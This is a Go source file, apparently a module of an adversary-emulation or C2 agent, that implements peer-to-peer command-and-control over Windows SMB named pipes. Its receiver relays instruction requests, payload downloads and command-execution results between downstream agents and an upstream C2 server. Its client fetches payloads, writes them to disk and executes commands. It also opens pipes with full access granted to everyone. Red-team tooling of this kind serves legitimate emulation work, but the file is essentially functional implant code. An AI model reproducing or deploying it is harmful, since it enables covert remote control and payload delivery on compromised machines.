package contact

import (
    "bufio"
    "fmt"
    "io"
    "net"
    "encoding/json"
    "time"
    "math/rand"
    "strings"
    "path/filepath"
    "../winio"
    "../output"
    "../execute"
    "../util"
)

const pipeLetters = "abcdefghijklmnopqrstuvwxyz"
const numPipeLetters = int64(len(pipeLetters))

//PipeAPI communicates through SMB named pipes. Implements the Contact interface
type SmbPipeAPI struct { }

//PipeReceiver forwards data received from SMB pipes to the upstream server. Implements the P2pReceiver interface
type SmbPipeReceiver struct { }

func init() {
	CommunicationChannels["P2pSmbPipe"] = SmbPipeAPI{}
	P2pReceiverChannels["SmbPipe"] = SmbPipeReceiver{}
}

// SmbPipeReceiver Implementation

// Listen on agent's main pipe for client connection, and then send them the name of an individual pipe to listen on.
func (receiver SmbPipeReceiver) StartReceiver(profile map[string]interface{}, p2pReceiverConfig map[string]string, upstreamComs Contact) {
    pipePath := "\\\\.\\pipe\\" + p2pReceiverConfig["p2pReceiver"]

    listener, err := receiver.listenPipeFullAccess(pipePath)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }

    output.VerbosePrint(fmt.Sprintf("[*] Listening on handler pipe %s", pipePath))

    defer listener.Close()

    // Whenever a new client connects to pipe with an individual pipe request, generate a new individual pipe for that client, listen on that pipe,
    // and give the pipe name to the client if pipe was successfully created.
    for {
        totalData, err := acceptPipeClientInput(listener)

        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            return
        }

        // convert data to message struct
        message := bytesToP2pMsg(totalData)

        // Handle request. We only accept requests for individual pipes.
        switch message.InstructionType {
        case INSTR_GET_INDIVID_PIPE:
            receiver.handleIndividualPipeRequest(profile, listener, upstreamComs)
        default:
            output.VerbosePrint(fmt.Sprintf("[!] ERROR: expected individual pipe request, received request type %d", message.InstructionType))
        }
    }
}

// Sets up listener on pipe for individual client
func (receiver SmbPipeReceiver) startIndividualReceiver(profile map[string]interface{}, pipePath string, upstreamComs Contact) {
    listener, err := receiver.listenPipeFullAccess(pipePath)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s\n%v", pipePath, err))
        return
    }

    output.VerbosePrint(fmt.Sprintf("[*] Listening on individual client pipe %s", pipePath))

    defer listener.Close()

	for {
        // Get data from client
        totalData, err := acceptPipeClientInput(listener)

        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input for pipe %s\n%v", pipePath, err))
            return
        }

        // Handle data
        listenerHandlePipePayload(totalData, profile, listener, upstreamComs)
	}
}

// When client sends this receiver an individual ipe request, generate a new random pipe to listen on solely for this client.
func (receiver SmbPipeReceiver) handleIndividualPipeRequest(profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    // Client pipe names will be 10-15 characters long
    clientPipeNameMinLen := 10
    clientPipeNameMaxLen := 15

    output.VerbosePrint("Received individual pipe request from client")

    // Create random pipe name
    rand.Seed(time.Now().UnixNano())
    clientPipeName := getRandPipeName(rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen)
    clientPipePath := "\\\\.\\pipe\\" + clientPipeName
    output.VerbosePrint(fmt.Sprintf("[*] Making individual client pipe %s", clientPipeName))

    // Start individual receiver on client pipe and send name to client.
    go receiver.startIndividualReceiver(profile, clientPipePath, upstreamComs)

    sendResponseToClient([]byte(clientPipeName), listener)

    output.VerbosePrint("Sent individual pipe response to client")
}

// Pass the instruction request to the upstream coms, and return the response.
func forwardGetInstructions(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("Forwarding instructions on behalf of paw %s", paw))

    // message payload contains profile to send upstream
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    clientProfile["server"] = profile["server"] // make sure we send the instructions to the right place.
    response := upstreamComs.GetInstructions(clientProfile)

    output.VerbosePrint(fmt.Sprintf("[*] Received instruction response for paw %s: %v", paw, response))

    // Return response downstream.
    data, _ := json.Marshal(response)
    sendResponseToClient(data, listener)

    output.VerbosePrint(fmt.Sprintf("Sent instruction response to paw %s", paw))
}

func forwardPayloadBytesDownload(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("Forwarding payload bytes request on behalf of paw %s", paw))

    // message payload contains file name (str) and platform (str)
    var fileInfo map[string]string
    json.Unmarshal(message.Payload, &fileInfo)

    response := upstreamComs.GetPayloadBytes(fileInfo["file"], profile["server"].(string), paw, fileInfo["platform"])

    // Return response downstream.
    sendResponseToClient(response, listener)

    output.VerbosePrint(fmt.Sprintf("Sent payload bytes paw %s", paw))
}

func forwardSendExecResults(message P2pMessage, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("Forwarding execution results on behalf of paw %s", paw))

    // message payload contains result info.
    var resultInfo map[string]string
    json.Unmarshal(message.Payload, &resultInfo)

    resultBytes := util.Decode(resultInfo["output"])

    upstreamComs.SendExecutionResults(resultInfo["id"], profile["server"].(string), resultBytes, resultInfo["status"], resultInfo["cmd"], resultInfo["pid"], paw)
    output.VerbosePrint(fmt.Sprintf("Sent execution results for paw %s", paw))

    // No response to send downstream
}

// Helper function that listens on pipe and returns listener and any error.
func (receiver SmbPipeReceiver) listenPipeFullAccess(pipePath string) (net.Listener, error) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    return winio.ListenPipe(pipePath, config)
}

// Helper function that creates random string of specified length using letters a-z
func getRandPipeName(length int) string {
    rand.Seed(time.Now().UnixNano())
    buffer := make([]byte, length)
    for i := range buffer {
        buffer[i] = pipeLetters[rand.Int63() % numPipeLetters]
    }

    return string(buffer)
}

// Helper function that waits for client to connect to the listener and returns data sent by client.
func acceptPipeClientInput(listener net.Listener) ([]byte, error) {
    conn, err := listener.Accept()

    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return nil, err
    }

    pipeReader := bufio.NewReader(conn)

    // Read in the data and close connection.
    data, _ := readPipeData(pipeReader)
    return data, nil
}

// Helper function that handles data received from the named pipe by sending it to the agent's c2/upstream server.
// Waits for original client to connect to listener before writing response back. TODO set timeout.
// Does not handle individual pipe request - those are handled in ListenForClient.
func listenerHandlePipePayload(data []byte, profile map[string]interface{}, listener net.Listener, upstreamComs Contact) {
    // convert data to message struct
    var message P2pMessage
    json.Unmarshal(data, &message)

    switch message.InstructionType {
    case INSTR_GET_INDIVID_PIPE:
        output.VerbosePrint("[!] ERROR: unexpected individual pipe request.")
	case INSTR_GET_INSTRUCTIONS:
	    forwardGetInstructions(message, profile, listener, upstreamComs)
	case INSTR_GET_PAYLOAD_BYTES:
	    forwardPayloadBytesDownload(message, profile, listener, upstreamComs)
	case INSTR_SEND_EXECUTION_RESULTS:
	    forwardSendExecResults(message, profile, listener, upstreamComs)
    default:
        output.VerbosePrint(fmt.Sprintf("[!] ERROR: invalid instruction type for p2p message %d", message.InstructionType))
    }
}

// Wait for client to connect to listener, and then send data.
func sendResponseToClient(data []byte, listener net.Listener) {
    conn, err := listener.Accept()

    defer conn.Close()

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener.\n%v", err))
        return
    }

    pipeWriter := bufio.NewWriter(conn)

    // Write & flush data and close connection.
    writePipeData(data, pipeWriter)
    conn.Close()
}

/*
 * SmbPipeAPI implementation
 */

// Contact API functions

func (p2pPipeClient SmbPipeAPI) GetInstructions(profile map[string]interface{}) map[string]interface{} {
    // Build SMB pipe message for instructions
    payload, _ := json.Marshal(profile)
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }
    pipeMsgData := buildP2pMsgBytes(paw, INSTR_GET_INSTRUCTIONS, payload)

    output.VerbosePrint("[*] P2p Client: going to fetch instructions")

    // Send beacon and fetch response
    pipePath := profile["server"].(string)
    sendSmbPipeClientInput(pipePath, pipeMsgData)
    responseData := fetchReceiverResponse(pipePath)

	var out map[string]interface{}
	if responseData != nil {
		output.VerbosePrint("[+] P2P beacon: ALIVE")
		json.Unmarshal(responseData, &out)
		out["sleep"] = int(out["sleep"].(float64))
		out["watchdog"] = int(out["watchdog"].(float64))
	} else {
		output.VerbosePrint("[-] P2P beacon: DEAD")
	}
	return out
}

func (p2pPipeClient SmbPipeAPI) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
    payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, p2pPipeClient.drop(payload, server, uniqueId, platform))
		}
	}
	return droppedPayloads
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (p2pPipeClient SmbPipeAPI) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
	var responseData []byte
	if len(payload) > 0 {
	    // Download single payload bytes. Create SMB Pipe message with instruction type INSTR_GET_PAYLOAD_BYTES
	    // and payload as a map[string]string specifying the file and platform.
		output.VerbosePrint(fmt.Sprintf("[*] P2p Client Downloading new payload: %s", payload))
        fileInfo := map[string]interface{} {"file": payload, "platform": platform}
        payload, _ := json.Marshal(fileInfo)
		pipeMsgBytes := buildP2pMsgBytes(uniqueID, INSTR_GET_PAYLOAD_BYTES, payload)

        sendSmbPipeClientInput(server, pipeMsgBytes)
        responseData = fetchReceiverResponse(server)
	}
	return responseData
}

func (p2pPipeClient SmbPipeAPI) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	p2pPipeClient.SendExecutionResults(command["id"], profile["server"], result, status, cmd, pid, profile["paw"].(string))
}

func (p2pPipeClient SmbPipeAPI) C2RequirementsMet(profile map[string]interface{}, criteria interface{}) bool {
    // Check if upstream P2P receiver works by fetching a unique pipe solely for this agent.
	result := p2pPipeClient.getIndividualPipe(profile)

    if len(result) > 0 {
        output.VerbosePrint(fmt.Sprintf("[*] Set pipe server path to unique pipe %s", profile["server"]))
        return true
    } else {
        output.VerbosePrint("[-] Failed to set P2P SMB pipe")
        return false
	}
}

func (p2pPipeClient SmbPipeAPI) SendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string, uniqueID string) {
    // Build SMB pipe message for sending execution results.
    // payload will be map containing output (result), status, pid, cmd, and command ID
    resultInfo := map[string]string {
        "output": string(util.Encode(result)),
        "status": status,
        "pid": pid,
        "cmd": cmd,
        "id": fmt.Sprintf("%s", commandID.(string)),
    }
    payload, _ := json.Marshal(resultInfo)
    pipeMsgData := buildP2pMsgBytes(uniqueID, INSTR_SEND_EXECUTION_RESULTS, payload)

    output.VerbosePrint("[*] P2p Client: going to send execution results")

    // Send results
    sendSmbPipeClientInput(server.(string), pipeMsgData)
}


// Helper functions

// Helper function that dials to server pipe to get individual pipe name to connect to for other transactions.
// Will change profile's server to the new pipe name. Returns pipe path on success, empty string on failure.
// Returns true on success.
func (p2pPipeClient SmbPipeAPI) getIndividualPipe(profile map[string]interface{}) string {
    // Build SMB Pipe message for requesting individual pipe.
    paw := ""
    if profile["paw"] != nil {
        paw = profile["paw"].(string)
    }

    pipeMsgData := buildP2pMsgBytes(paw, INSTR_GET_INDIVID_PIPE, nil)

    output.VerbosePrint("[*] P2P Client: Going to get individual pipe.")

    // Send request and fetch response
    pipePath := profile["server"].(string)
    sendSmbPipeClientInput(pipePath, pipeMsgData)
    responseData := fetchReceiverResponse(pipePath)

    if responseData != nil {
        // We got the pipe name to use next.
        newPipeName := string(responseData)
        output.VerbosePrint(fmt.Sprintf("[*] Obtained individual pipe name %s", newPipeName))

        // Replace server for agent.
        serverHostName := strings.Split(profile["server"].(string), "\\")[2]
        newServerPipePath := "\\\\" + serverHostName + "\\pipe\\" + newPipeName
        output.VerbosePrint(fmt.Sprintf("[*] Setting new server %s", newServerPipePath))

        profile["server"] = newServerPipePath

        return newServerPipePath
    } else {
        return ""
    }
}

// Download single payload and write to disk
func (p2pPipeClient SmbPipeAPI) drop(payload string, server string, uniqueID string, platform string) string {
    location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
	    data := p2pPipeClient.GetPayloadBytes(payload, server, uniqueID, platform)

        if data != nil {
		    util.WritePayloadBytes(location, data)
		}
	}
	return location
}

// Sends data to specified pipe.
func sendSmbPipeClientInput(pipePath string, data []byte) {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("Error: %v", err))
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return
    }

    // Write data and close connection.
    writer := bufio.NewWriter(conn)
    writePipeData(data, writer)

    conn.Close()
}

// Read response data from receiver using given pipePath.
func fetchReceiverResponse(pipePath string) []byte {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        if err == winio.ErrTimeout {
            output.VerbosePrint(fmt.Sprintf("[!] Timed out trying to dial to pipe %s", pipePath))
        } else {
            output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s\n", pipePath, err))
        }
        return nil
    }

    defer conn.Close()

    // Read data and return.
    pipeReader := bufio.NewReader(conn)
    data, _ := readPipeData(pipeReader)
    return data
}

/*
 * Other auxiliary functions
 */

// Returns data and number of bytes read.
func readPipeData(pipeReader *bufio.Reader) ([]byte, int64) {
    buffer := make([]byte, 4*1024)
    totalData := make([]byte, 0)
    numBytes := int64(0)
    numChunks := int64(0)

    for {
        n, err := pipeReader.Read(buffer[:cap(buffer)])
        buffer = buffer[:n]

        if n == 0 {
            if err == nil {
                // Try reading again.
                time.Sleep(200 * time.Millisecond)
                continue
            } else if err == io.EOF {
                // Reading is done.
                break
            } else {
                 output.VerbosePrint("[!] Error reading data from pipe")
                 return nil, 0
            }
        }

        numChunks++
        numBytes += int64(len(buffer))

        // Add data chunk to current total
        totalData = append(totalData, buffer...)

        if err != nil && err != io.EOF {
             output.VerbosePrint("[!] Error reading data from pipe")
             return nil, 0
        }
    }

    // Data has been read from pipe
    output.VerbosePrint(fmt.Sprintf("[*] Read in %d chunks, %d bytes from pipe", numChunks, numBytes))

    return totalData, numBytes
}

func writePipeData(data []byte, pipeWriter *bufio.Writer) {
    n, err := pipeWriter.Write(data)

    if err != nil {
        if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error writing data to pipe\n%v", err))
            return
	    }
    }

    err = pipeWriter.Flush()
	if err != nil {
	    if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error flushing data to pipe\n%v", err))
		    return
	    }
	}

    output.VerbosePrint(fmt.Sprintf("[*] Wrote %d bytes to pipe", n))
}